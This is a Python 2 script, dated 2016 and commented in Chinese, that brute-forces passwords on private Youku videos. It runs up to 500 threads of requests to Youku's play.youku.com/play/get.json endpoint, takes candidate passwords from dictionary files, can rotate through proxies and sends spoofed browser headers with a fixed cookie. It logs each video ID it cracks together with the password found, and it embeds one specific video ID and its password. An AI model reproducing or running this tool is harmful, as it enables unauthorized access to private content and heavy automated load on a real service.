#20160612
#  coding:utf8
#youku Dictionary Crack passwd. 第一个参数为videoid或者多个id的.cfg文件，第2个参数为dict文件名，默认为dict.txt
#support .cfg dict file name list
#speed 1S  100 /s
#crack的写入okfilename，每次加载新id会比较，结果写入resultfilename
import sys
import datetime
import re
import httplib
import threading , Queue ,time
import random
import urllib2
import os 
sys.path.append("../mymodule")
import func	

#有2个创建http请求的方法 
 

#unit test setting
testmode  = 1                       #test one url use dict 只测试testvideoid, dict还是正常的
testvideoid = "XNzc3NDc3ODAw"      #my test video id ，it's right pwd is "112698" http://v.youku.com/v_show/id_XNzc3NDc3ODAw.html
test_pwd = "112698"


USE_HTTPLIB = 1

USE_PROXY = 0     #是否使用代理
USE_PROXYFILE = 0  #是否使用代理列表文件读出多个代理扫描
PROXY_SERVER2 = "10.94.235.27:8080" #固定代理 ，USE_PROXYFILE =0启用

printmode = 0
logmode   = 0


TIME_OUT_VALUE = None
#TIME_OUT_VALUE   =    [0.8,1,1.5]  #第一次连接超时时间S
MAX_THREADS_NUM  =    500   #线程池的最大线程数990 ,1000多会创建失败，越多越快 ulimit可放开，= userspace memsize / stacksize = 2G /512K
MAX_TRYCONNECT_NUM =  2    #最多重试次数 ,在超时或者10055情况下重试
conncouter = 0
connclosecouter = 0
 
 
okfilename    = 'ID_found.txt'     #找到的ID 
failedfilename   = "ID_NO_found.txt" #没找到的ID

resultfilename    = 'ID_result.txt'     #找到的ID和密码结果
proxyfilename     = 'proxy.txt' #代理服务器文件

 


EXCEPTIONLOG = 1

RESULT_FOUNDPWD = 1   #密码正确
RESULT_TRYAGAIN  = 2  #需要重试 超时或者10055情况下重试 ，配合 MAX_TRYCONNECT_NUM 使用
RESULT_WRONGPWD = 3   #密码错误
RESULT_ERROR    = 4  #其他错误

header = {#'Refer':'http://v.youku.com/v_show/id_XNTA1OTI3Mjcy.html',                 
        'Accept':'*/*',      
    #    'Accept-Encoding':'gzip,deflate,sdch', #Exception :'utf8' codec can't decode byte 0x8b in position 1: invalid start byte
        'Accept-Language':'zh-CN,zh;q=0.8',
        'User-Agent':'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22',
        'Accept-Charset':'GBK,utf-8;q=0.7,*;q=0.3',
        'Connection':'keep-alive',
        'Cookie':'__ysuid=1363957560246L7v; ykss=e5984d51f43453401b35df2e'}
        	
    	
global proxyfilelines
global videoidfilename  


printlock = threading.Lock()
def _print(value):
   printlock.acquire()
   if printmode == 1:
	    print(value )    
   if logmode  == 1:
      fplog.write(value+'\n')
   printlock.release()         
   return
   
   
class MT(object):
   def __init__(self, func, arg0, argsVector, MAXTHREADS=15, queue_results=True):
                self._func = func
                self._lock = threading.Lock()
                self._Arg0 = arg0
                self._nextArgs = iter(argsVector).next
                self._threadPool = [ threading.Thread(target = self._doFunc) for i in range (MAXTHREADS)]
                
                self._stopAllThread = False

                if queue_results:
                   self._queue = Queue.Queue()
                else:
                   self._queue = None
                 

                ''' if USE_HTTPLIB == 1:
                  self.connPool = []
                  for i in range(MAXTHREADS):
                    conn = httplib.HTTPConnection(host, timeout = 0.8)                    
                    conn.connect()
                    self.connPool.append( conn )  
                self._nextConn = iter(self.connPool).next'''
 
                   
   def _doFunc(self): #find one pwd
                videoid  = self._Arg0
                while (True):                
                	 if (self._stopAllThread):
                	    break
                   #get next passwd for crack   
                	 self._lock.acquire()
                	 try:
                	      try:
                	           arg = self._nextArgs()
                	      except StopIteration:
                	           break
                	 finally:
                	      self._lock.release()   
                   
                	 returnvalue = self._func(self._Arg0, arg)

                	 if (returnvalue == RESULT_FOUNDPWD):
                	 	   _print(" Stop all threads !\n") 
                       # 记录结果到queue
                	 	   if self._queue is not None :
                	 	     self._queue.put((self._Arg0, arg))                       	 	   
                	 	   self._stopAllThread = True
                	 	   break
                     
             
               
   def get(self, *a, **kw):
                if self._queue is not None:
                    return self._queue.get(*a, **kw)
                else:
                    raise ValueError, 'Not queueing results'
                    
   def quewrite(self, fpresult):
               if self._queue.empty():
               	# think it
                
                 return False
      
               while not self._queue.empty():                  
                  (viedioid, pwd) = self._queue.get()
                  fpresult.write("http://v.youku.com/v_show/id_%s.htm    %s" %(viedioid, pwd))
                  fpresult.write("\n")
               
               return True   
               
               
                  
                   

   def start(self):
                for thread in self._threadPool:
                    time.sleep(0)  #give chance to other threads
                    thread.start()
                
   def join(self, timeout = None):
                for thread in self._threadPool:
                    thread.join(timeout)

	
             #try one pwd  
def getpwd(  videoid, pwdToTry):              
              threadid = threading.currentThread().name
              for i in range( MAX_TRYCONNECT_NUM ):                   
                   try:                
                          timebefore =  time.time()  
                          rand = str(random.randint(1000,9999))                       
                          url = "/play/get.json?vid="\
                              + videoid + "&ct=10&pwd="\
                              + pwdToTry +"&ran="+rand       

                          if USE_PROXYFILE == 1:
                             PROXY_SERVER = proxyfilelines[random.randint(0,len(proxyfilelines)-1)].strip()  #strip /r/n     	  
                          
                          host ="play.youku.com"
                          if USE_PROXY == 1:
                             conn = httplib.HTTPConnection(PROXY_SERVER, timeout = 1)
                          else:
                          	 conn = httplib.HTTPConnection(host, timeout = 1)
                          this_header =  header
                          this_header['Refer'] = 'http://v.youku.com/v_show/id_'+ videoid +'.html'
                          conn.request( 'GET', url, '', this_header )
                          resp = conn.getresponse()
                          if resp.status != 200 : #and resp.status != 302:           
                               _print ("%s %s  videoid %s, pwd %s"%( resp.status, resp.reason , videoid, pwdToTry))  
                               continue
                               
                          #print(resp.read())                #test    
                          #print(resp.read().decode('utf_8'))                #test    
                          content = resp.read().decode('utf_8')
                          #content = resp.read()                         
                          #_print(content.encode('gbk'))                #test    

                          _print(content)                #test    
                          
                          WRONG_PATTERN = "error"         #错误结果网页中的模板字符串  
                          if content.find(WRONG_PATTERN)!= -1:
                            timecost =  time.time()-timebefore   
                            _print ("thread %s get Wrong PWD, videoid %s, pwd %s   ,cost %s s"%(threadid, videoid,  pwdToTry, timecost))  
                            return RESULT_WRONGPWD
                          
                          rematch = re.compile(r'"stream":(.*)segs')   #正确结果网页中的模板字符串  
                          cont = rematch.findall(content)     
                          if len( cont ) == 0 :        
                         	   timecost =  time.time()-timebefore  
                         	   _print ("thread %s get Not Match pattern ! videoid %s, pwd %s  , cost %s s"%(threadid, videoid,  pwdToTry, timecost))  
                         	   break
   
                          str1 = cont[0]                           
                          if len(str1) > 10 :      #find it!
                         	   timecost =  time.time()-timebefore   
                         	   if USE_PROXY == 1:                         	   
                         	     # print ("thread %s get it!! use %s flv is %s. videoid %s, pwd %s  ,cost %s s"%(threadid, PROXY_SERVER, str1, videoid,  pwdToTry, timecost))                                                	   
                         	      print ("Get it!! use %s. videoid %s, pwd %s  ,cost %s s"%(PROXY_SERVER,  videoid,  pwdToTry, timecost))                                                	   
                         	   else:
                         	   	  #print ("thread %s get  it!! flv is %s. videoid %s, pwd %s  ,cost %s s"%(threadid, str1, videoid,  pwdToTry, timecost))                                                	   
                         	      print ("Get it!!   videoid %s, pwd %s  ,cost %s s"%( videoid,  pwdToTry, timecost))                                                	   
                         	   return RESULT_FOUNDPWD
                          else:
                         	   _print ("Pattern len is less than 10! flv is %s. videoid %s, pwd %s"%(str1, videoid,  pwdToTry))  
                         	   break                                            
                   except  Exception, e:       
                          _print (" Exception :%s videoid %s, pwd %s"%(str(e), videoid,  pwdToTry))                  	 	
                          continue
                          #if (str(e).find("10055") > -1) or (str(e).find("timed out") > -1):                              
                          #	  _print ("10055 timed out,try again  :  videoid %s, pwd %s"%(  videoid,  pwdToTry)) 
                          #	  continue
                          #else:
                          #	  break  
                          	  
              return   	RESULT_ERROR
  
def get_ID_for_Crack(idlist):
    global videoidfilename
    ID_OK_SET = set() 
    if os.path.exists(okfilename):    
       fpok     = open(okfilename,'r') #read 
       oklines  = fpok.readlines() 
       for eachLine in oklines:
       	   eachid = eachLine.strip()
       	   if len(eachid) > 0:
       	   	  ID_OK_SET.add(eachid)
       fpok.close()
    print ("The number of  ids which has cracked get from file named %s : %s"%(okfilename, len(ID_OK_SET)))
       
       	
    ID_FAIL_SET = set() 
    if os.path.exists(failedfilename):    
       fpfailed     = open(failedfilename,'r') #read 
       failedlines  = fpfailed.readlines() 
       for eachLine in failedlines:
       	   eachid = eachLine.strip()
       	   if len(eachkid) > 0:
       	   	  ID_FAIL_SET.add(eachid)
       fpfailed.close()
    print ("The number of id which failed cracked get from file named %s : %s"%(failedfilename, len(ID_FAIL_SET)))
    
   #第1个参数是id文件或单个videoid，否则就是默认文件videoid.cfg 

    if (len(sys.argv) > 1):
       argv1 = sys.argv[1]      #just a video id        
    else:
       argv1  = 'videoid.cfg';   
    Has_OK_Counter = 0   
    same_counter = 0
    if '.' in argv1 :     #is a file
    	  videoidfilename = argv1
    	  if not os.path.exists(videoidfilename):
    	    sys.stderr.write('youkucrack:  ERROR: sys.argv[1] was not found! No exist .cfg extensioni file !')
    	    sys.exit(1)       	    	
    	  print("youku video id is from file named %s"%videoidfilename)
    	  videoid_file = open(videoidfilename,'r') #read
    	  videoid_file_lines = videoid_file.readlines()
    	  videoid_file.close()       
    	  print("videoid_file_lines is %s"%len(videoid_file_lines))
    	  for eachLine in videoid_file_lines: 
           eachid = eachLine.strip()      
           if len(eachid) == 0 : 
              continue  
           if eachid in ID_OK_SET: #has cracked before
              Has_OK_Counter = Has_OK_Counter + 1
              continue    
           b_same = False
           for checkid in idlist:
           	  if eachid == checkid:
           	  	 b_same = True
           	  	 break
           if (b_same):
              same_counter = same_counter + 1
           else:
              idlist.append(eachid)
    	  print("Total number of id need to crack get from file named %s is : %s,   %s ids has been cracked. same is %s "
    	        %(videoidfilename, len(idlist), Has_OK_Counter, same_counter))   
           
    else :
    	  if not ('.' in argv1) :    
    	  	 idlist.append(argv1)
    	  	 print("youku video id is %s"%argv1)
        
def get_pwd_or_dictname_list( pwdlist, dictfilenamelist):
   #第2个参数是dict文件或单个pwd，没有就是默认文件dict.txt, 如果带.cfg则是多个dict文件

   #dict file is setup, only get dict file name list  
    if (len(sys.argv) > 2):
       argv2 = sys.argv[2]              
    else:
       argv2  = 'dict.txt'; 
       print("Argv did not indicate any dict file name or pwd , get the default dict file name is %s"%argv2)                    

    if '.cfg' in argv2 :  #indicate it is a .cfg file which has some dict file names 
    	  dict_config_filename = argv2 
    	  if not os.path.exists(dict_config_filename):                                                   
    	        print('youkucrack:  ERROR: %s dict cfg file was not found!   !'%dict_config_filename) 
    	        sys.exit(1)                                                                        
    	  print("The dict config file name is %s"%dict_config_filename)
    	  dictcfgfile = open(dict_config_filename,'r') #read 
    	  dictfilenamelines = dictcfgfile.readlines()
    	  dictcfgfile.close()        
    	  for eachLine in dictfilenamelines:
    	      dictfilename = eachLine.strip() 
    	      if len(dictfilename) == 0:
    	         continue
    	      if not os.path.exists(dictfilename):
    	         print('youkucrack:  ERROR: %s dict file was not found!   !'%dictfilename)    	      
    	         continue
    	      dictfilenamelist.append(dictfilename)   	      
    	      print("The dict file name %s is added ."%dictfilename)
    	      
    elif '.' in argv2 :	 #indicate it is only a dict file name
    	 dict_file_name = argv2
    	 if not os.path.exists(dict_file_name):
    	    print('youkucrack:  ERROR: %s dict file was not found!   !'%dict_file_name)
    	 print("The dict file name %s is added."%dict_file_name)
    	 dictfilenamelist.append(dict_file_name)
       
    else :
    	  pwd = argv2
    	  print("Only test a pwd is added. : %s"%pwd)
    	  pwdlist.append(pwd) 
 
def get_pwdlist_from_dict(dict_file_name, pwdlist):
    
    print("Using dict named %s ....!"%dict_file_name)
    if not os.path.exists(dict_file_name):  
    	print(" dict named %s not exist!"%dict_file_name)
    	return 
    	
    dictfile = open(dict_file_name,'r')
    dictfilelines = dictfile.readlines()
    dictfile.close()      
    
    for eachLine in dictfilelines: 
       eachpwd = eachLine.strip()
       if len(eachpwd) == 0:
          continue
       pwdlist.append(eachpwd)
          
def crack_id_use_pwdlist(idlist, pwdlist):
    oklist = [] #id cracked
    fpresult = open(resultfilename,'a')    #append 
    fpok     = open(okfilename,'a')    #append   
    counter = 0
    for video_id in idlist :
       timebefore =  time.time()
       counter = counter + 1
       _print("try get pwd . %s/%s video_id: %s ." % (counter, len(idlist),  video_id ))
       mt = MT(getpwd, video_id, pwdlist, MAX_THREADS_NUM)
       mt.start()
       mt.join()        
       print("crack over . %s/%s  video_id: %s. run cost %s  s." % (counter, len(idlist),  video_id, time.time()-timebefore))
       found = mt.quewrite(fpresult)      
       fpresult.flush()      
       if found == True:
       	  oklist.append(video_id)
       	  fpok.write("%s" %  video_id) #record the okid the the okid file for future compare
       	  fpok.write("\n")       	  
    fpresult.close()     	  
    fpok.close()	  
                       
    del_counter = 0
 
    for okid in oklist: #del  id which has been cracked
    	for i in range(len(idlist)):
    	   if okid == idlist[i]:            	   	
    	      del idlist[i]       
    	      del_counter =  del_counter + 1
    	      print("cracked, so deleted the id %s from id list"%okid)
    	      break

    print("total %s video id  has been deleted for having been cracked this turn.  "% (del_counter))
    print("writed %s id cracked to the file named %s."% (len(oklist), okfilename))
        	  
    return len(oklist)
 
               
if __name__ == '__main__':
    
    pwdlist = []
    idlist = []
    dictfilenamelist = []
    videoidfilename = None
    
    print("argv1 is youku video id or id file(.cfg), argv2 is dict file or config file(file should have a ., cfg file should have .cfg)")

    if (len(sys.argv) == 1 or testmode == 1):  #test mode    
    	 idlist.append(testvideoid)                            
    	 pwdlist.append(test_pwd)                                 
    	 print("Test mode, only use a id %s and the PWD %s"%(testvideoid, test_pwd))         
    else:   
    	 #第一个参数id file or id 第2个参数 dict file or pwd
      get_ID_for_Crack(idlist)                                                                                                                                                                                  
      if (len(idlist)==0):                                                                                                                                                                                      
         print("No video id need to be crack !, I can't run, now exit !")                                                                                                                        
         sys.exit(1)                                                                                                                                                                                            

      get_pwd_or_dictname_list(pwdlist, dictfilenamelist)
      if (len(pwdlist)==0 and (len(dictfilenamelist) == 0)):
         print("No indicate dict file or pwd, I can't run, now exit !")
         sys.exit(1) 

    if USE_PROXYFILE == 1:
       proxyfile = open(proxyfilename,'r')
       proxyfilelines = proxyfile.readlines()
       proxyfile.close()      
  
    if testmode == 0 and len(dictfilenamelist) > 0:    	  
       for dict_file_name in dictfilenamelist:
          pwdlist = [] #clean
          get_pwdlist_from_dict( dict_file_name, pwdlist)
          print(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time())))
          print ("video_id size : %s, dict file name %s ,size: %s "%(len(idlist), dict_file_name, len(pwdlist)))
          num_id_cracked = crack_id_use_pwdlist(idlist, pwdlist)  
          print("finished carcking using dict named %s ,  the number of id cracked :%s" % ( dict_file_name, num_id_cracked))               	  
    else:
          num_id_cracked = crack_id_use_pwdlist(idlist, pwdlist)  
          print("finished carcking. No using dictfile ,  the number of id cracked :%s" % ( num_id_cracked))               	  


    #empty  videoidfile and write ids not cracked back to file
    if videoidfilename is not None :
    	 #os.remove(videoidfilename)
    	 fp_id_left = open(videoidfilename, 'w') #clean and write
    	 for id in idlist:
    	   fp_id_left.write(id)
    	   fp_id_left.write('\n')
    	 fp_id_left.close()   
    	 print("video id file named %s cleaned the id cracked, left id number is %s" % ( videoidfilename, len(idlist)))              	   

    
    
